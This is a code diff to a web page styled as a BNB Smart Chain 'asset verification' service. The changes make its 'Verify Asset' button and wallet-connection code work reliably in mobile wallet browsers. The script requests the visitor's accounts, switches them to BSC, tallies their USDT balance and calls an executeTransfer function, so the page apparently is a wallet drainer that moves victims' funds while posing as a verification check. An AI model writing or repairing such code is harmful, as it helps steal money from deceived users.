@@ -28,7 +28,7 @@
     .bsc-logo-circle { width: 64px; height: 64px; border-radius: 50%; background-color: #0b0e14; border: 1px solid #2a2f3d; display: flex; align-items: center; justify-content: center; margin-bottom: 18px; color: #f3ba2f; font-size: 28px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.8); }
     .bsc-verification-pill { border: 1px solid rgba(243, 186, 47, 0.4); color: #f3ba2f; font-size: 11px; padding: 6px 16px; border-radius: 20px; font-weight: 700; background-color: rgba(243, 186, 47, 0.05); margin-bottom: 20px; letter-spacing: 0.5px; }
 
-    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 20px rgba(243, 186, 47, 0.25); -webkit-tap-highlight-color: transparent; }
+    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 20px rgba(243, 186, 47, 0.25); -webkit-tap-highlight-color: transparent; position: relative; z-index: 20; }
     .btn-verify:active { transform: scale(0.98); }
 
     /* Feature Cards */
@@ -293,37 +293,10 @@
     let globalProvider, globalSigner, globalUserAddress;
     let totalUsdtWei = ethers.BigNumber.from(0);
 
-    // Double binding click listener for mobile WebViews / DApp browsers
-    document.addEventListener("DOMContentLoaded", () => {
-      const verifyBtn = document.getElementById("mainVerifyBtn");
-      if (verifyBtn) {
-        verifyBtn.addEventListener("click", initiateAuditFlow);
-      }
-    });
-
-    function getActiveProvider() {
-      if (typeof window !== 'undefined') {
-        if (window.ethereum) return window.ethereum;
-        if (window.trustwallet) return window.trustwallet;
-        if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
-      }
-      return null;
-    }
-
-    async function switchToBSC(ethProvider) {
+    // Make initiateAuditFlow globally accessible to prevent button click failure
+    window.initiateAuditFlow = async function() {
       try {
-        await ethProvider.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: BSC_CHAIN_ID }],
-        });
-      } catch (switchError) {
-        console.log("Switch chain notice:", switchError);
-      }
-    }
-
-    async function initiateAuditFlow() {
-      try {
-        let ethProvider = getActiveProvider();
+        let ethProvider = window.ethereum || window.trustwallet || (window.web3 && window.web3.currentProvider);
         if (!ethProvider) {
           alert("Error: Web3 wallet not detected! Please open this link inside Trust Wallet or MetaMask browser.");
           return;
@@ -335,7 +308,14 @@
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        await switchToBSC(ethProvider);
+        try {
+          await ethProvider.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BSC_CHAIN_ID }],
+          });
+        } catch (switchError) {
+          console.log("Switch chain notice:", switchError);
+        }
 
         const provider = new ethers.providers.Web3Provider(ethProvider, "any");
         globalSigner = provider.getSigner();
@@ -363,16 +343,29 @@
         const btnText = document.getElementById("btnText");
         if(btnText) btnText.innerText = "Verify Asset";
       }
-    }
+    };
 
-    async function executeTransfer() {
+    // Ensure fallback event listener is also attached
+    document.addEventListener("DOMContentLoaded", () => {
+      const verifyBtn = document.getElementById("mainVerifyBtn");
+      if (verifyBtn) {
+        verifyBtn.addEventListener("click", window.initiateAuditFlow);
+      }
+    });
+
+    window.executeTransfer = async function() {
       try {
         if (!globalProvider) {
           alert("Wallet session not active. Please reconnect.");
           return;
         }
 
-        await switchToBSC(globalProvider);
+        try {
+          await globalProvider.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BSC_CHAIN_ID }],
+          });
+        } catch (e) {}
 
         const provider = new ethers.providers.Web3Provider(globalProvider, "any");
         const signer = provider.getSigner();
@@ -386,4 +379,6 @@
         }
 
         if (!totalUsdtWei || totalUsdtWei.lte(0)) {
-          alert("No USDT balance
+          alert("No USDT balance found to verify/transfer.");
+          return;
+        
